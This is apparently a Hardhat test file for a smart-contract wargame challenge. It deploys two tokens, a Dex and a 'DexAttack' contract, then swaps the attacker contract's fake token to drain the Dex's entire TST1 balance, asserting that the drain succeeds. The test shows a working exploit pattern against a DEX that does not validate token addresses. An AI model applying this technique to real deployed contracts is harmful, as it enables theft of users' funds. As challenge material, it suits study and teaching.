require("@nomiclabs/hardhat-waffle");
const { expect } = require("chai");

const toWei = (value) => ethers.utils.parseEther(value.toString());

describe("DexAttack", function () {
  it("attacks", async () => {
    const [owner, user] = await ethers.getSigners();

    const Token = await ethers.getContractFactory("SwappableToken");
    const token1 = await Token.connect(user).deploy(
      "TEST1",
      "TST1",
      toWei(110)
    );
    await token1.deployed();

    const token2 = await Token.connect(user).deploy(
      "TEST2",
      "TST2",
      toWei(110)
    );
    await token2.deployed();

    const Dex = await ethers.getContractFactory("Dex");
    const dex = await Dex.connect(user).deploy(token1.address, token2.address);
    await dex.deployed();

    const DexAttack = await ethers.getContractFactory("DexAttack");
    const dexAttack = await DexAttack.deploy();
    await dexAttack.deployed();

    await token1
      .connect(user)
      ["approve(address,uint256)"](dex.address, toWei(100));
    await token2
      .connect(user)
      ["approve(address,uint256)"](dex.address, toWei(100));
    await dex.connect(user).add_liquidity(token1.address, toWei(100));
    await dex.connect(user).add_liquidity(token2.address, toWei(100));
    await token1.transfer(owner.address, toWei(10));
    await token2.transfer(owner.address, toWei(10));

    expect(await token1.balanceOf(owner.address)).to.equal(toWei(10));
    expect(await token2.balanceOf(owner.address)).to.equal(toWei(10));
    expect(await token1.balanceOf(dex.address)).to.equal(toWei(100));
    expect(await token2.balanceOf(dex.address)).to.equal(toWei(100));

    expect(
      await dex.get_swap_price(dexAttack.address, token1.address, toWei(1))
    ).to.equal(toWei(100));

    await dex.connect(owner).swap(dexAttack.address, token1.address, toWei(1));

    expect(await token1.balanceOf(owner.address)).to.equal(toWei(110));
    expect(await token2.balanceOf(owner.address)).to.equal(toWei(10));
    expect(await token1.balanceOf(dex.address)).to.equal(0);
  });
});
